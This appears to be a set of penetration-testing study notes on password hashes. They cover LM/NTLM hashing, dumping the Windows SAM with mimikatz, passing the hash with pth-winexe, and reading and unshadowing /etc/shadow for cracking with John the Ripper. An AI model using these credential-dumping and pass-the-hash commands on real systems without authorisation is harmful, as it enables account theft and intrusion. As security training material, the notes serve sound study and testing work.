==========================
retrieving password hashes
==========================
guess hash algorighm
	guessed with
		length
		character set
		special characters
	tool
	hashid <hash>

linux hash container
	stored in /etc/shadow

windows hash conatiner
	stored in sicurity accounts manager(SAM)
	NT-based operating system : up to windows 2003
		Lan Manager(LM) : based on DES
			   ┌───password123───┐
			   | (split at 7th)  |
			passwor		    d123
			   |		     |
			  DES		    DES
			   └──>HASH1,HASH2<──┘ *no salt

		NT Lan Manager(NTLM) : based MD4
			PassWord123 --> MD4 --> HASH *no salt
	crack : run mimikatz.exe with administrative privilege
		privilege::debug
			Privilege '20' OK --> administrative privilege
		token::elevate
			elevate privilege
		lsadump::sam
			dump the hashes

===========================
passing the hash in windows
===========================
LM & NTLM vulnerability
	1. attacker attempt to access resource
	2. server sends authentication challenge
	3. attacker supplies username and stolen hash
	4. hash is sent to server
	5. server checks hash value against expected value
	6. access granted to resource
step
	pth-winexe -U <username>%<hash> //<target ip> <execute shell>

=================
password cracking
=================
bruteforce
	john <hash file> --format=<hash format>
with wordlist
	john --wordlist=<wordlist> <hash file> --format=<hash format>
apply jtr's word mangling rules
	john --rules --wordlist=<wordlist> <hash file> --format=<hash format>
linux password hashes
	grep <username> /etc/passwd > passwd-file.txt
	sudo gerp <username> /etc/shadow > shadow-file.txt
	unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
	john --rules --wordlist=<wordlist> unshadowed.txt
multithread
	--fork
multiple computer
	--node
cracking with gpu
	use hashcat
		https://hashcat.net/wiki/
